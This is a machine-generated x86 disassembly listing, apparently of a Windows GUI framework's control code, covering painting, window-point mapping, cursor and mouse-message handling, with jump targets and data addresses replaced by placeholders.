call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435686
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4356b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4345d4
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_4032f4
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_4032f4
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_4032f4
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_4032f4
jmp r-xdata
sub_4357a8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412598
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_435c90
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_434a20
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_434a34
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4125e8
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_435988
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4345a8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_4032f4
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43b290
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4321a4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_435973
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43b290
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43b290
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434430
test esi esi
je r-xdata
sub_435988
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_4032f4
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43680c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4032f4
mov eax esi
call sub_4344d8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_434494
mov ecx eax
xor edx edx
xor eax eax
call sub_4125c0
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_4032f4
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_435a2c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_435a5c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_435ac8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_435b88
sub_435af8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_435b28
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4345d4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_435b54
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_435b88
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_435c5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_435c90
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_435d28
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44b71c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44b71c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434630
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_454ec8
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_4032f4
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44b660
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_4032f4
jmp r-xdata
sub_435ebc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4085f0
mov edi eax
mov eax [ esi + 0x64 ]
call sub_40861c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_434630
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408434
call sub_4083d0
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4083d0
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_435f64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_435f94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_435f58
push ebp
call sub_435f64
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435fe4
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_436070
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4360a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_435b28
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b5d0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4032f4
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b5d0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_4032f4
sub_43612c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434600
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_434cc8
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4360a8
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_436178
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434600
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_436194
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_434600
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_434cc8
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4360a8
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_4032f4
sub_4361ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_435ac8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_435a5c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_435ac8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_436288
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4360a8
pop esi
pop ebx
retn
sub_4362ad
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4360a8
pop esi
pop ebx
retn
sub_4362d3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4360a8
pop esi
pop ebx
retn
sub_4362fd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4360a8
pop esi
pop ebx
retn
sub_436323
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_436358
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_435b28
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b5d0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_4032f4
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b5d0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_4032f4
sub_4363d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_436408
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44b5d0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_4032f4
sub_436440
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_434cc8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_436408
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4067a0
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4032f4
sub_4364b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_436408
pop esi
pop ebx
retn
sub_4364d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_436408
pop esi
pop ebx
retn
sub_4364f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44b5d0
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_4032f4
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_43fbe8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_436550
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_434cb8
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_434cc8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_435c5c
pop esi
retn
sub_436590
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
